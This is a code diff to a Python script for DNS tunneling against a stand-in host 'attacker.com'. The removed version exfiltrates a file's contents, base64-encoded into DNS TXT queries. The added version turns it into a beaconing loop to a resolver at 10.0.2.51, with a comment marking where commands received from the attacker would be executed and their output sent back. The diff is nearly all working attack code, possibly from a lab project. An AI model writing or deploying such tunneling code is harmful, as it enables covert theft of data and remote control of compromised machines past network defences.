@@ -1,30 +1,62 @@
 
 import base64
-import dns.resolver
+import dnslib
+import socket
+import time
 
-def chunk_string(s: str, size: int):
-    return [s[i:i+size] for i in range(0, len(s), size)]
+def print_status(s: str): 
+    print(f"[*] {s}")
 
-def tunnel_file(file_path: str, attacker_domain: str): 
 
-    payload_chunk_size = 30
+class Tunneler: 
+    def __init__(self, attacker_domain: str, resolver_ip_addr: str): 
+        self.attacker_domain = attacker_domain
+        self.resolver_ip_addr = resolver_ip_addr
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    with open(file_path) as f: 
-        for line in f: 
-            chunked_string = chunk_string(line, payload_chunk_size)
+    def tunnel(self, text: str) -> str | None: 
+        # chunked_string = self._chunk_string(text)
 
-            for payload in chunked_string: 
-                encoded = base64.urlsafe_b64encode(payload.encode()).decode().strip("=")
+        # for payload in chunked_string: 
+        encoded = base64.urlsafe_b64encode(text.encode()).decode().strip("=")
 
-                domain = f"{encoded}.{attacker_domain}"
-                answers = dns.resolver.resolve(domain, "TXT")
+        domain = f"{encoded}.{self.attacker_domain}"
 
-                for r in answers:
-                    response = r.strings[0].decode()
-                    decoded = base64.urlsafe_b64decode(response + "==").decode()
-                    print(decoded)
+        print_status(f"Resolving query {domain}")
 
+        q = dnslib.DNSRecord.question(domain, qtype="TXT")
+
+        self.socket.sendto(q.pack(), (self.resolver_ip_addr, 53))
+
+        response, _ = self.socket.recvfrom(4096)
+
+        reply = dnslib.DNSRecord.parse(response)
+
+        for rr in reply.rr: 
+            if rr.rtype == dnslib.QTYPE.TXT: 
+                return base64.urlsafe_b64decode(str(rr.rdata)).decode()
+        return None
+        
+
+    def _chunk_string(self, s: str): 
+        return [s[i:i+30] for i in range(0, len(s), 30)]
+
+
+def main(): 
+    tunneler = Tunneler("attacker.com", "10.0.2.51")
+    to_tunnel = "DNS Tunneling Established"
+    while True: 
+        response = tunneler.tunnel(to_tunnel)
+        if not response: 
+            continue
+        print_status(response)
+        if response == "ACK": 
+            continue
+        # execute response and set to tunnel to the output
+        
+        time.sleep(5)
 
 
 if __name__ == "__main__": 
-    tunnel_file("data.txt", "attacker.com")
+    main()
+
